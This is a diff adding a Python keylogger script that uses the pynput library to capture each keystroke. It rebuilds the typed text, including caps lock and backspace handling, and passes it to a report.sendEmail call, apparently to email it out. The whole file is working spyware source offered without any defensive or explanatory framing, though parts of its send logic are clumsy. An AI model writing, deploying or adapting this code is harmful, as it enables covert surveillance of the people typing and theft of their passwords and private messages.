@@ -1,0 +1,63 @@
+import pynput
+from pynput.keyboard import Key, Listener
+
+import report
+
+count = 0
+keys = ""
+caps = False
+
+def on_press(key):
+    print(key, end= " ")
+    #print("pressed")
+    global keys, count, caps
+    try:
+        if caps:
+            keys = keys + str(key.char).swapcase()
+        else:
+            keys = keys + str(key.char)
+
+    except Exception:
+        if str(key) == 'Key.space':
+            keys += " "
+
+        elif str(key) == 'Key.shift':
+            pass
+
+        elif str(key) == 'Key.backspace':
+            keys = keys[:-1]
+
+        elif str(key) == 'Key.caps_lock':
+            caps = True
+            count += 1
+            if count > 1:
+                count = 0
+                caps = False
+
+        elif str(key) == 'Key.enter':
+            keys += '\n'
+
+        else:
+            keys += str(key) + " "
+
+        email(keys)
+
+def email(keys):
+    message = ""
+    for key in keys:
+        k = key.replace("'","")
+        if key == "Key.space":
+            k = " "
+        elif key.find("Key")>0:
+            k = ""
+        message += k
+    print(message)
+    report.sendEmail(message)
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+with Listener(on_press = on_press, on_release = on_release) as listener:
+    listener.join()
